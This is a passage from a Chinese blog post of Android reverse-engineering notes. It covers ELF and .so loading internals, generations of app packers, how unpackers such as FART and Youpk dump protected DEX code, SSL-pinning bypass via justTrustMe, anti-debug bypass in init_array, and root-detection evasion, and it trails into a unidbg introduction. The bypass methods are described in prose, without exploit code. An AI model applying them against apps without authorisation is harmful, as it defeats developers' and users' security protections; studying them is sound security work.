Elf32_Half    e_type;      <span class="comment">/*2字节，ELF文件的类型 安卓上的so文件就是分享文件，一般该字段为3*/</span></span><br><span class="line">  Elf32_Half    e_machine;   <span class="comment">/*2字节，该字段标志该文件运行在什么机器架构上。183为Arm64 40为                                  Arm32*/</span></span><br><span class="line">  Elf32_Word    e_version;   <span class="comment">/*该字段表示当前so文件的版本信息，一般为1,同EL_VERSION*/</span></span><br><span class="line">  Elf32_Addr    e_entry;     <span class="comment">/*该字段是一个偏移地址，为程序启动的地址，_start函数*/</span></span><br><span class="line">  Elf32_Off    e_phoff;      <span class="comment">/*该字段也是一个偏移地址，指向程序头(Pargram Header)的起始地址</span></span><br><span class="line"><span class="comment">  Elf32_Off    e_shoff;      /*该字段是一个偏移地址，指向节区头(Section Header)的起始地址 */</span></span><br><span class="line">  Elf32_Word    e_flags;     <span class="comment">/*该字段表示该文件的权限，常见的值有1、2、4，分别代表read、write、exec  */</span></span><br><span class="line">  </span><br><span class="line">  Elf32_Half    e_ehsize;    <span class="comment">/* 该字段表示elf文件头部大小，一般固定为52 64为elf为64 */</span></span><br><span class="line">  Elf32_Half    e_phentsize; <span class="comment">/*该字段表示程序头元素的长度  */</span></span><br><span class="line">  Elf32_Half    e_phnum;      <span class="comment">/*该字段表示文件中有几个程序头 */</span></span><br><span class="line">  Elf32_Half    e_shentsize;  <span class="comment">/*该字段表示节区头(Section Header)大小，一般固定为40. */</span></span><br><span class="line">  Elf32_Half    e_shnum;      <span class="comment">/*该字段表示文件中有几个节区头。*/</span></span><br><span class="line">  Elf32_Half    e_shstrndx;   <span class="comment">/*该字段是一个数字，这个表明了.shstrtab节区(这个节区存储着所有节区的名字，例如.text)的节区头是第几个。找到后里面有个偏移，跟进就能看到所有节区名字   */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h4 id="Section-Header">Section Header</h4><p>readelf -s <a href="http://xx.so">xx.so</a>  查看符号表信息</p><p>section header table是一个数组结构，这个数组的位置在<em>e_shoff</em>处，共有<em>e_shnum</em>个元素(即section)，每个元素的大小为<em>e_shentsize</em>字节。每个元素的结构如下:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    <span class="keyword">sh_name; </span>       <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word    <span class="keyword">sh_type; </span>       <span class="comment">/* Section type 不同section存储内容不同*/</span> </span><br><span class="line">  Elf32_Word    <span class="keyword">sh_flags; </span>       <span class="comment">/* 表示所映射内容的权限，section属性 */</span></span><br><span class="line">  Elf32_Addr    <span class="keyword">sh_addr; </span>       <span class="comment">/* 如果该section需要在运行时加载到虚拟内存中，该字段就是对应section内容(第一个字节)的虚拟地址 */</span></span><br><span class="line">  Elf32_Off    <span class="keyword">sh_offset; </span>       <span class="comment">/* 内容起始地址相对于文件开头的偏移 */</span></span><br><span class="line">  Elf32_Word    <span class="keyword">sh_size; </span>       <span class="comment">/* 内容的大小 */</span></span><br><span class="line">  Elf32_Word    <span class="keyword">sh_link; </span>       <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word    <span class="keyword">sh_info; </span>       <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word    <span class="keyword">sh_addralign; </span>  <span class="comment">/* 内容地址的对齐，如果有的话需要满足sh_addr % sh_addralign = 0 */</span></span><br><span class="line">  Elf32_Word    <span class="keyword">sh_entsize; </span>       <span class="comment">/* 有的内容是也是一个数组，这个字段就表示section本身大小 */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><h4 id="Program-Header">Program Header</h4><p>program header table用来保存程序加载到内存中所需要的信息，使用段(segment)来表示。与section header table类似，同样是数组结构。数组的位置在偏移<em>e_phoff</em>处，每个元素(segment header)的大小为<em>e_phentsize</em>，共有<em>e_phnum</em>个元素。单个segment header的结构如下:</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">``</span>Elf32_Word  p_type;    /*<span class="string">` `</span>Segment <span class="string">``</span>type<span class="string">` `</span>*<span class="string">``</span>/</span><br><span class="line"> <span class="string">``</span>Elf32_Off  p_offset;   /*该segment的数据在文件中的偏移地址(相对文件头) */</span><br><span class="line"> <span class="string">``</span>Elf32_Addr  p_vaddr;   /*<span class="string">` `</span>segment数据应该加载到进程的虚拟地址 */</span><br><span class="line"> <span class="string">``</span>Elf32_Addr  p_paddr;   /*<span class="string">`segment数据应该加载到进程的物理地址(如果对应系统使用的是物理地址) `</span><span class="string">`*`</span><span class="string">`/</span></span><br><span class="line"><span class="string"> `</span><span class="string">`Elf32_Word  p_filesz;   /*该segment数据在文件中的大小*/</span></span><br><span class="line"><span class="string"> `</span><span class="string">`Elf32_Word  p_memsz;    /*该segment数据在内存中的占据的空间，可为0*/</span></span><br><span class="line"><span class="string"> `</span><span class="string">`Elf32_Word  p_flags;    /*进程中该segment的权限(R/W/X) */</span></span><br><span class="line"><span class="string"> `</span><span class="string">`Elf32_Word  p_align;    /*该segment数据的对齐，2的整数次幂。 */</span></span><br><span class="line"><span class="string">&#125; Elf32_Phdr;</span></span><br></pre></td></tr></table></figure><h2 id="so加载流程">so加载流程</h2><p><a href="https://www.cnblogs.com/vendanner/p/4979177.html">https://www.cnblogs.com/vendanner/p/4979177.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458301381&amp;idx=1&amp;sn=0e42666b65b0fa87211b3b4c65fa9e10&amp;chksm=b181834f86f60a59bd29398a968c178ae977d4ebef3703abb15f990ded62e37e6bc594df8924&amp;scene=27">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458301381&amp;idx=1&amp;sn=0e42666b65b0fa87211b3b4c65fa9e10&amp;chksm=b181834f86f60a59bd29398a968c178ae977d4ebef3703abb15f990ded62e37e6bc594df8924&amp;scene=27</a></p><p><a href="https://www.cnblogs.com/bingghost/p/6297325.html">https://www.cnblogs.com/bingghost/p/6297325.html</a></p><p><a href="https://wooyun.js.org/drops/Android%20Linker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html">https://wooyun.js.org/drops/Android Linker学习笔记.html</a></p><p>执行流程如下图<img src="assets/image-20240612194533721.png" alt="image-20240612194533721"></p><p>先调用dlopen来载入so文件；find_library在soinfo结构(进程加载的so链)中查找当前so是否已载入，否则去执行so载入流程。so载入后，find_library会返回soinfo，去执行so的CallConstructors函数；如果so包含init、init_array段，则此函数会先执行这init和init_array。dlopen函数执行完毕表示系统对so操作告一段落，接着通过dlsym获取地址去执行JNI_LOAD。对一般而言so的加载和执行到此为止了，下图是我们通常会关注到的执行流程：(其中还有一个关注点：_system_property_get(“ro.build.version.sdk”)，当他被调用了，init_proc函数也刚刚被调用)</p><p><strong>unidbg原理</strong>书籍：</p><ul><li>System的loadlibrary函数调用runtime的loadlibrary函数，跟进</li><li>loader.findlibrary：首先判断classloader是否空，不空调用loader.findlibrary，传入so名称来搜索全路径，如果找到调用doload方法来加载(classloader是个抽象类，需查看BaseDexClassLoader下的findlibrary的实现)</li><li>调用pathList下的findlibrary，跟进</li><li>大概就是从类加载器的依赖库路径中寻找该名字的依赖库，找到后返回全路径</li><li>找到后进入doload方法：该方法判断类加载器是否为BaseDexClassLoader子类，也就是判断是否使用的是第三方自定义类加载器，如果不是则从类加载器中获取系统路径，传递nativeload</li><li>nativeload==》Runtime_nativeLoad，跟进</li><li>有个参数filename是so的名称，不空调用vm-&gt;LoadNativeLibrary传入so名称和类加载器，跟进LoadNativeLibrary</li><li>检查是否加载过，如果没有则通过dlopen传入的so名称类加载器进行加载，返回一个handle句柄，搜索该handle的jni_onload方法并调用</li><li>深入dlopen，调用do_dlopen返回soinfo类型指针result作为结果，他位于linker.cpp中，即进入linker代码细节</li></ul><p><img src="assets/image-20240612194624245.png" alt="image-20240612194624245"></p><p>find_library的实现实际是调用find_library_internal</p><p><img src="assets/image-20240612194914752.png" alt="image-20240612194914752"></p><p>后续操作看上面链接</p><h2 id="五代安卓壳基础总结">五代安卓壳基础总结</h2><p><a href="https://blog.csdn.net/weixin_42454310/article/details/129518883">https://blog.csdn.net/weixin_42454310/article/details/129518883</a></p><p><a href="https://bbs.kanxue.com/thread-275826.htm#msg_header_h2_1">https://bbs.kanxue.com/thread-275826.htm#msg_header_h2_1</a></p><p><a href="https://www.cnblogs.com/chenliangcl/p/9154052.html">https://www.cnblogs.com/chenliangcl/p/9154052.html</a></p><h3 id="第一代：动态加载">第一代：动态加载</h3><p>对于第一代和第二代壳而言，apk没有完整原始的dex，需要运行时动态加载到内存中</p><p><strong>落地加载</strong></p><p>我们拿到需要加密的Apk和自己的壳程序Apk，然后用加密算法对源Apk进行加密再将壳Apk进行合并得到新的Dex文件，最后替换壳程序中的dex文件即可，得到新的Apk,那么这个新的Apk我们也叫作脱壳程序Apk.他已经不是一个完整意义上的Apk程序了。</p><p>他的主要工作是：负责解密源Apk.然后加载Apk,让其正常运行起来。运行时首先将我们的Dex文件或者Apk文件解密，然后利用DexClassLoader加载器将其加载进内存中，然后利用反射加载待加固的Apk的Appkication，然后运行待加固程序即可。</p><p><img src="assets/image-20240612131836401.png" alt="image-20240612131836401"></p><p>代码实现如下</p><p><img src="assets/image-20240612131912696.png" alt="image-20240612131912696"></p><h4 id="优劣">优劣</h4><p><strong>缺点</strong></p><p>解密后的dex存放在文件中，可以直接获取</p><p>可以通过hook虚拟机关键函数，在加载关键逻辑时把dex在内存中dump下来</p><h3 id="第二代：内存不落地加载">第二代：内存不落地加载</h3><p>落地加载将Dex文件解密出来会保存到文件中，再通过DexClassLoader加载进内存中，而不落地加载直接重写<strong>DexClassLoader使其可以直接加载字节数组</strong>，避免写入文件中。</p><p>我们要做的是<strong>重写DexClassLoader</strong>，而这涉及到三个函数defineClass、findClass、loadClass，在一个类被加载的时候，会先后调用这三个函数加载一个类，所以我们需要重写这三个函数。系统的DexClassLoader加载Dex进入内存的也必然是通过字节加载的，而在系统so中的libdvm.so中的openDexFile可以直接加载Dex文件，那么现在清楚了，我们可以通过编写so文件调用openDexFile函数加载Dex字节数组，值得注意的是，openDexFile函数返回值为一个int类型的cookie，可以简单理解成一个dex文件的’身份码’，通过该’身份码’即可操控这个dex文件,至于怎么调用该函数，可以通过dlopen和dlsym函数调用。</p><p>代码实现</p><p><img src="assets/image-20240612132311671.png" alt="image-20240612132311671"></p><h4 id="优劣-2">优劣</h4><p>• 优点<br>比较容易实现，无明显的兼容性问题 能有效对抗静态分析和二次打包</p><p>• 缺点<br>启动时需要进行大量的解密运算，容易造成卡死的情况 在内存中的数据为完整的Dex，通过动态调试Dump内存即可获取完整的Dex</p><h3 id="第三代：指令抽取">第三代：指令抽取</h3><p>**开发过程：**首先经保护级别到函数级别，然后将原始的dex内函数内容CodeItem清场，单独转移到加密文件，运行时再讲函数内容重新恢复到对应的函数体。</p><p><strong>核心逻辑</strong>：****</p><ol><li>加载后恢复函数内存到dex所在的内存区域</li><li>虚拟机读取dex文件后，其中有一个指向函数内容的CodeItem，可以通过修改这个指针修改对应函数内容</li><li>拦截虚拟机内与查找执行代码相关的函数，返回函数内容</li></ol><p>主要分为两个步骤指令抽取和指令还原</p><p>• <strong>指令抽取</strong><br>解析原始Dex文件格式，保存所有方法的代码结构体信息，通过传入需要置空指令的方法和类名，检索到其代码结构体信息。通过方法的代码结构体信息获取指令个数和偏移地址，构造空指令集，然后覆盖原始指令，重新计算dex文件的checksum和signature信息，回写到头部信息中</p><p><img src="assets/image-20240612132418395.png" alt="image-20240612132418395"></p><p><img src="assets/image-20240612132426342.png" alt="image-20240612132426342"></p><ul><li><strong>指令还原</strong></li></ul><p>native层hook系统函数dexFindClass，获取类结构体信息（dexFindClass函数用于查找类的DexClassDef结构），获取类中所有的方法信息，通过指定方法名进行过滤，获取该方法的代码结构体信息，获取该方法被抽取的指令集，修改方法对应的内存地址为可读属性，直接进行指令还原。</p><ul><li>首先就是还原点，通常在art::ClassLoader::LoadMethod函数中进行，所以加壳apk需要hook此函数。（注意不同android版本下此函数的导出符号略有差别）</li><li>由于art虚拟机下dex2oat会对dex文件进行优化生成oat文件，而apk后续执行就会直接加载oat文件，这样我们还原dex文件中的字节码是无效的，因此需要阻止dex2oat执行，分析dex2oat执行被执行的代码发现可以通过hook execve来阻止dex2oat的执行。（android 10开始默认不在对应用程序加载的dex文件执行dex2oat，所以可以省略此步）</li></ul><p>优劣</p><p>• 优点<br>加密粒度变小，加密技术从Dex文件级变为方法级 按需解密，解密操作延迟到某类方法被执行前，如果方法不被执行，则不被解密 解密后的代码在内存不连续，克服了内存被Dump的缺点，有效保护了移动客户端的Java代码</p><p>• 缺点<br>使用大量的虚拟机内部结构，会出现兼容性问题，无法保护所有方法 无法对抗自定义虚拟机 它跟虚拟机的JIT优化出现冲突，达不到最佳的性能表现</p><h3 id="第四代：转换指令">第四代：转换指令</h3><p><strong>核心逻辑</strong></p><ol><li>dex文件的函数被标记为native，内容被抽取转化为jni标准的动态库so文件，so文件通过jni和android系统交互</li><li>函数体内容被抽离并转化为自定义的指令格式，该格式使用自定义的接收器执行，然后jni和系统交互。</li></ol><h4 id="Vmp">Vmp</h4><p>存在一个映射表256种，映射到自己虚拟的指令集当中。</p><p><strong>原理</strong></p><p>执行到关键代码时进入壳so执行，关于这一点，不同的厂商有着不同的做法，比如把关键函数变成native函数，在壳so中动态或者静态注册</p><p><img src="assets/image-20240612132708003.png" alt="image-20240612132708003"></p><p>再比如更改关键方法的方法体</p><p><img src="assets/image-20240612132724763.png" alt="image-20240612132724763"></p><p>无论哪种方法其实都是为了能让壳函数代替原函数去执行 当执行该函数的指令时，解析出指令的OpCode,通过一个巨大的switch case找到处理对应OpCode的函数，然后执行</p><p>简单讲就是壳将原本的指令进行一次封装，将原本的指令转换为另一种表现形式</p><h4 id="Dex2C"><strong>Dex2C</strong></h4><p>首先也是将关键代码注册为native函数，主要借助于JNI反射技术，将Java层的方法全部反射为native层，增大分析难度。之后再通过混淆、字符串加密等操作生成so，最后将so进行加固保护。</p><h3 id="第五代：vmp虚拟机源码保护技术">第五代：vmp虚拟机源码保护技术</h3><p><strong>图片大纲</strong></p><p><img src="assets/image-20240612134553120.png" alt="image-20240612134553120"></p><h2 id="一些脱壳机的原理">一些脱壳机的原理</h2><h4 id="FRIDA-DEXDump">FRIDA-DEXDump</h4><p>通过Frida在内存中搜索dex\n035，因为Dex的头部都会存在一个dex\n035的模数，所以通过在内存中搜索dex\n035可以搜索到Dex文件。对于一些Dex它们被抹去了头部信息，对于这样的情况，FRIDA-DEXDump也提供了对应的方法，通过遍历当前进程中所有可以读的内存段，通过判断这个段的大小和Dex文件中一些关键区域的关系可以判断是否为一个Dex。</p><h4 id="Youpk">Youpk</h4><p>从ClassLinker中遍历所有DexFile对象，在虚拟机中Dex文件都用DexFile对象来表示，并Dump出所有Dex文件。此时只是整体Dump，Dex中的方法还未还原。遍历DexFile中的ClassDef结构，获取到所有Class，主动调用Class中的所有的方法，让程序强制走switch解释器执行，在解释器中添加Hook代码，当方法执行时自动保存CodeItem。根据保存的CodeItem和Dump下来的Dex进行合并，还原Dex中被抽取的指令。</p><p><strong>简单操作</strong></p><p>具体可以参考github官方文档</p><p>配置待脱壳的App包名adb shell “echo <a href="http://com.xxx">com.xxx</a> &gt;&gt; /data/local/tmp/unpacker.config”<br>启动Apk等待脱壳，每隔10秒将自动重新脱壳(已完全dump的dex将被忽略), 当日志打印unpack end时脱壳完成<br>dump文件路径为/data/data/包名/unpacker，使用adb命令将文件pull出</p><h4 id="Fart">Fart</h4><p>Fart脱壳的步骤主要是三步：</p><ul><li>内存中DexFile结构体完整dex的dump</li><li>主动调用类中的每一个方法，并实现对应CodeItem的dump</li><li>通过主动调用dump下来的方法的CodeItem进行dex中被抽取方法的修复</li><li><img src="assets/image-20240612194014694.png" alt="image-20240612194014694"></li></ul><h5 id="Fart的三个组件">Fart的三个组件</h5><p>脱壳组件 主动调用组件 修复组件。</p><p>三个组件可以分离单独使用</p><p><strong>脱壳组件</strong></p><ul><li><p>源码中在调用实现DexClassLoader后就会进入Dex2oat(二进制文件)编译的优化，会进入CompileMethod方法，会有一个判断是否对函数进行编译，返回true，<br>就会进行编译(compile_method=driver-&gt;GetCompile()-&gt;Compile(code_item,…)) 这里的code_item就是指令部分，可以脱壳。**注意：**CompileMethod方法：对函数进行编译，不编译类初始化函数 not <clinit></p></li><li><p>art_method.h中有一个方法GetDexFile可以获得artmethod对象所在的dexfile，DexFile类中有获得begin和size的方法。</p></li><li><p>Fart第一个脱壳点：如果dex2oat被禁用掉，那么所有函数都会进入解释器，在进入解释器解释之前，会经过一个Execute方法。然后经过上面的操作即可dump。PrettyMethod()获取方法名。</p></li><li><p>Execute是内联函数，不容易被厂商进行hook修改逻辑。且是一个好的脱壳点，因为类初始化必然经过这里</p></li></ul><p><img src="assets/image-20240612212554093.png" alt="image-20240612212554093"></p><p><strong>主动调用组件</strong></p><p>现有脱壳点的存在问题 见下图<br><img src="assets/image-20240613131811978.png" alt="image-20240613131811978"></p><p><img src="assets/image-20240613132713276.png" alt="image-20240613132713276"></p><p>在实现主动调用组件，需要解决三个问题</p><ol><li>如何构造主动调用链并让每一个函数能到达主动调用过程，但又不影响app正常运行</li><li>如何根据ArtMethod定位内存中对应的CodeItem起始地址</li><li>如何遍历dex中所有函数并完成主动调用</li></ol><p>解决问题一</p><ul><li>jni接口与java层交互的标准流程<br>1）通过FindClass()得到jclass (代码实现是通过class_linker的FindClass()取得目标类的jclass)<br>2）通过GetMethod()得到jmethodID (代码实现是FindMethodID)<br>3）通过一系列call开头的函数完成调用 (最终会进入ArtMethod的invoke函数)</li><li>根据jni接口调用java函数的思路构造主动调用链</li><li>DexFile类中定义一个native函数 dumpMethodCode()<img src="assets/image-20240613134941181.png" alt="image-20240613134941181"></li></ul><p><img src="assets/image-20240613135028062.png" alt="image-20240613135028062"></p><p><img src="assets/image-20240613135349407.png" alt="image-20240613135349407"></p><p>解决问题二：dumpArtMethod()的实现</p><p>通过art_method.h的GetCodeItemOffset()方法得到起始地址。</p><p>获得结束地址就要看dex文件结构了<img src="assets/image-20240613140404947.png" alt="image-20240613140404947"></p><p>codeitem前面十六个字节固定，从ushort insns开始不同函数就不一样了，所以只要得到了这个codeitem结构的大小就可以确定结束地址了。<strong>tryitem结构体大小为8个字节</strong></p><p>修复过程中通过Art_method对象的方法来获得method唯一标识。</p><p>解决问题三：</p><p>getClassloader()获取加壳app替换的那个classloader</p><p>loadclassandInvoke()：加载类和调用函数</p><p><img src="assets/image-20240613142238083.png" alt="image-20240613142238083"></p><ul><li>获得类列表后，fartwithClassloader主动加载所有类，在调用loadclassandInvoke()：加载类和调用函数，调用函数的实现是通过反射获得方法对象，然后dumpMethodCode()。</li></ul><p><strong>修复组件</strong></p><p><img src="assets/image-20240613144453099.png" alt="image-20240613144453099"></p><p>解析dex中的类和函数</p><p>解析过程</p><ul><li>正则匹配 组件2 dump下的bin文件内容的格式放入一个表中</li><li>main函数读dex文件名，获得class个数</li><li>获得方法的idx，然后查表，base解码解析</li></ul><h2 id="抓包">抓包</h2><h3 id="justTrustMe-的原理">justTrustMe 的原理</h3><p>justTrustMe 是一个 Xposed 模块，用于绕过 Android 应用的 SSL 证书验证。它的原理是 Hook 系统的 javax.net.ssl.X509TrustManager 类，使其在检查服务器证书时始终返回成功。这样，即使服务器使用了自签名证书或抓包工具的证书，应用也会接受。</p><h2 id="Android系统从按下开机键，启动流程是怎么样的">Android系统从按下开机键，启动流程是怎么样的</h2><ul><li>设备初始化（Bootloader 和硬件初始化）：当按下开机键时，首先启动的是设备的 Bootloader。Bootloader 是一段运行在设备上的低级代码，负责初始化硬件（如 CPU、内存等），设置启动参数，并加载 Android 操作系统内核。</li><li>内核启动：在 Bootloader 加载 Android 内核后，内核开始执行。内核初始化设备驱动，挂载文件系统，并启动 init 进程。</li><li>init 进程：init 进程是 Android 系统中的第一个进程（进程 ID 为 1）。它负责启动和管理 Android 系统中的其他进程。init进程从/init.rc（Android 8.0 及以下）或 /system/etc/init`（Android 9.0 及以上）文件中读取配置信息，以确定需要执行的操作。这些操作包括挂载文件系统、设置系统属性、启动服务等。</li><li>启动 Zygote 进程：init进程启动Zygote 进程，这是 Android 系统中所有 Java 应用程序（包括应用和系统服务）的父进程。Zygote进程启动时会加载 Android 框架和系统类库，创建一个预初始化的Dalvik或ART` 虚拟机实例。</li><li>启动 SystemServer 进程：Zygote进程会通过fork()系统调用创建一个新的进程，称为SystemServer 进程。SystemServer` 进程负责启动 Android 系统的核心服务，如 Activity Manager、Package Manager、Window Manager 等。</li><li>启动 Launcher 和其他应用程序：当 SystemServer 进程完成系统服务的启动，Android 系统就准备好了运行应用程序。首先启动的应用程序通常是 Launcher，它负责显示桌面和应用程序列表。此后，其他应用程序会根据需要启动。</li><li><img src="assets/image-20240723120547445.png" alt="image-20240723120547445"></li></ul><h2 id="Android的init-array和JNI-OnLoad的时机问题，如何绕过init-array段中的反调试">Android的init_array和JNI_OnLoad的时机问题，如何绕过init_array段中的反调试</h2><p>init_array 和 JNI_OnLoad 都是 Android Native 库加载时的初始化操作。它们的执行时机和作用分别是：</p><pre><code>init_array：init_array 是一个 ELF（可执行与可链接文件格式）二进制文件中的一个段（section），它包含了一组函数指针。这些函数在 Native 库加载时自动执行，通常用于完成库的初始化操作。init_array 中的函数在库加载到内存并解析符号表之后、JNI_OnLoad 调用之前执行。JNI_OnLoad：JNI_OnLoad 是一个特殊的 Java Native Interface（JNI） 函数，当 Native 库被 Java 层加载时，它会自动调用。JNI_OnLoad 函数用于初始化 Native 库，注册 JNI 方法，并在需要时执行其他自定义操作。JNI_OnLoad 在 init_array 中的所有函数执行完成后调用。</code></pre><p>要绕过 init_array 段中的反调试操作，可以采取以下方法：</p><pre><code>静态分析：使用反编译工具（如 IDA Pro、Ghidra 或 Hopper）对 Native 库进行静态分析，找到 init_array 段中的反调试代码。然后，可以修改二进制文件以禁用或移除这些代码。修改完成后，重新打包应用程序并安装到设备上。这样，应用程序在运行时将不会执行反调试操作。动态调试：使用动态调试工具（如 gdb、lldb 或 radare2）附加到目标进程。在 Native 库加载之前，设置断点（breakpoint）以拦截 init_array 段中的函数调用。在断点处，可以修改寄存器值、内存内容或堆栈信息，以绕过反调试代码。需要注意的是，使用动态调试工具可能会被反调试代码检测到，因此可能需要使用一些额外的技巧，如隐藏调试器、使用插件（如 Android-Inline-Hook）等。</code></pre><h2 id="linker-加载-so-流程，so-有依赖时如何执行">linker 加载 so 流程，so 有依赖时如何执行</h2><p>linker 加载 so（共享库）文件的流程如下：</p><pre><code>加载共享库：系统将 so 文件加载到进程的内存空间中。重定位：根据 so 文件中的重定位表，修复符号引用的地址。解析依赖：如果 so 文件依赖其他共享库，linker 会递归加载、重定位这些依赖库。初始化：执行 so 文件中的初始化函数，如全局变量初始化、静态代码块执行等。</code></pre><p>当 so 文件有依赖时，linker 会根据依赖关系先后加载、重定位依赖库，确保依赖库中的符号能被正确引用。</p><h2 id="root检测与绕过">root检测与绕过</h2><p><a href="https://mp.weixin.qq.com/s/0pd4MfW933klMjM-4XMUZg">https://mp.weixin.qq.com/s/0pd4MfW933klMjM-4XMUZg</a></p><p><strong>root检测方式</strong></p><ol><li>已安装App检测，如是否有magisk</li><li>非法二进制文件检测，如”/sbin/su，/system/su，/system/bin/su”</li><li>Prop检测，如”ro.debuggable，ro.secure”，<br>“ro.secure” 是一个 Android 操作系统中的系统属性（System Property），它控制着该设备是否开启了安全性强化措施。如果该属性的值为 “1”，则表示该设备已开启安全性强化措施。如果该属性的值为 “0”，则表示该设备未开启安全性强化措施。但是ro.secure不能盲目相信。</li><li>/System,/data分区是否可写  /system    /system/bin    /system/sbin    /system/xbin    /vendor/bin   /sbin         /etc    /sys    /proc   /dev</li><li>查看发布的版本是测试版还是正式版即检测<code>ro.build.tags</code></li><li>检测su命令 <code>which su</code></li><li>busybox检测 BusyBox就好像是个大工具箱，它集成压缩了 Linux 的许多工具和命令。</li></ol><p>总结为三点</p><ol><li>目录特征检测</li><li>尝试执行root后的一些操作</li><li>读取手机编译版本，调试状态</li></ol><p><strong>root绕过方式</strong></p><ul><li>直接找到检测root的代码，hook 返回false</li><li>Objection  <code>android root disable</code> 只是绕过了一些java层的root检测</li><li>重打包 给app植入Frida-gadget或者xposed框架后就能无root使用frida</li><li>编译系统，修改su等特征性的东西</li><li>面具模块 新版本可以直接Zygisk对指定app隐藏root</li></ul><h2 id="绕过SSL证书">绕过SSL证书</h2><ul><li>APK 的 target sdk version &lt;= 23 时，默认是信任用户添加的第三方证书的</li></ul><p>unidbg 断点功能</p><p>防抓包绕过</p><p>抓包过程中如何确定关键点</p><p>安卓里面的zygote的理解</p><p>unicorn原理</p><p>VMP解释器定位流程</p><p>frida hook相关知识 断点类型，具体怎么实现的，区别是什么</p><p>怎么定位反调试位置，如果有反调试怎么绕过，如果找不到相关的反调试函数怎么办，怎么去分析</p><p>生命周期</p><p>界面出现一个弹框，当前界面的生命周期的变化</p><p>动态加载dex的dexclassloader的hook方法 脱壳点oncreate，inmemorydexclassloader实例化</p><p>四大组件 server</p><p>项目</p><p>如何确定关键位置</p><p>arm汇编指令</p><p>抖音自动化滑块思路</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>Unidbg</h1><h2 id="Capstone-Unicorn-Keystone">Capstone Unicorn Keystone</h2><p>Capstone 反汇编框架</p><p>Unicorn CPU模拟执行框架</p><ul><li>好比一个cpu 模拟执行各种指令 提供了编程语言接口，可以操作内存，寄存器，但它不是一个系统，内存管理，文件系统，系统调用等都需要自己实现</li></ul><p>Keystone 汇编框架</p><p><strong>Ubuntu安装三个框架</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安装capstone</span></span><br><span class="line">pip install capstone</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装Unicorn</span></span><br><span class="line">pip install Unicorn</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装Keystone</span></span><br><span class="line">pip install keystone<span class="punctuation">-</span>engine</span><br></pre></td></tr></table></figure><h2 id="一些基本使用">一些基本使用</h2><h3 id="Unidbg简单介绍">Unidbg简单介绍</h3><ul><li>支持对so的加载</li><li>支持对jni接口函数的模拟调用</li><li>支持常见的syscalls的模拟调用</li><li>支持arm32和arm64</li><li>支持android和IOS</li><li>基于HookZz实现的inline hook，xhook实现的hook，IOS fishhook，substrate，whale hook等 以及支持gdb，ida远程调式等高级功能</li><li>支持Dynarmic，</li><li>支持基于Dobby的Inline hook 基于xHook的GOT hook</li></ul><p>驱动unidbg的底层引擎：Dynarmic(效率更高) Unicorn</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//启用Dynarmic引擎 ，注释默认unicorn</span></span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        DynarmicLoader.useDynarmic();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unidbg示例讲解">unidbg示例讲解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">emulator = AndroidEmulatorBuilder   <span class="comment">//构建模拟器实例</span></span><br><span class="line">                .for32Bit()</span><br><span class="line">                <span class="comment">//添加DynarmicFactory后端工厂，为true含义：如果出现问题 退回Unicorn工厂</span></span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">DynarmicFactory</span>(<span class="literal">true</span>))</span><br><span class="line">                .build();</span><br><span class="line"><span class="comment">//后端工厂除了DynarmicFactory 还支持hypervisor，KVM，Unicorn2，及默认的Unicorn</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//loadlibrary两个参数，第一个是so的路径，第二个是 是否自动执行init函数</span></span><br><span class="line"><span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;so_path&quot;</span>), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 